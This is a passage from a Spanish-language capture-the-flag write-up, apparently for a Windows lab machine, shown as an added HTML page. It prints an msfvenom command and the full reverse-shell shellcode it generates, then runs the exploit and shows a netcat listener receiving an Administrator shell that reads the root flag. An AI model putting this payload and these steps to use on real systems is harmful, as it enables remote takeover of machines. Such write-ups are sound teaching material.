+<p class="plain-text">Ya que podemos ejecutar comandos con este exploit solo nos queda generar un nuevo shellcode usando <code class="language-plaintext highlighter-rouge">msfvenom</code> que envie una reverse shell por el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of python file: 1823 bytes
+shellcode =  b""
+shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
+shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
+shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
+shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
+shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
+shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
+shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
+shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
+shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
+shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
+shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
+shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
+shellcode += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
+shellcode += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
+shellcode += b"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
+shellcode += b"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40"
+shellcode += b"\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
+shellcode += b"\x6a\x05\x68\x0a\x0a\x0e\x0a\x68\x02\x00\x01"
+shellcode += b"\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74"
+shellcode += b"\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75"
+shellcode += b"\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d"
+shellcode += b"\x64\x00\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12"
+shellcode += b"\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01"
+shellcode += b"\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
+shellcode += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc"
+shellcode += b"\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
+shellcode += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2"
+shellcode += b"\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
+shellcode += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f"
+shellcode += b"\x6a\x00\x53\xff\xd5"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos el proxy desde la maquina victima y al correr nuestro exploit final nos envia una shell como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> donde podemos leer la flag final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 127.0.0.1 on port 8888: Done
+[</span><span class="az">*</span><span class="p">] Closed connection to 127.0.0.1 port 8888</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.198
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+buff\administrator
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+c1a**************************33b
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
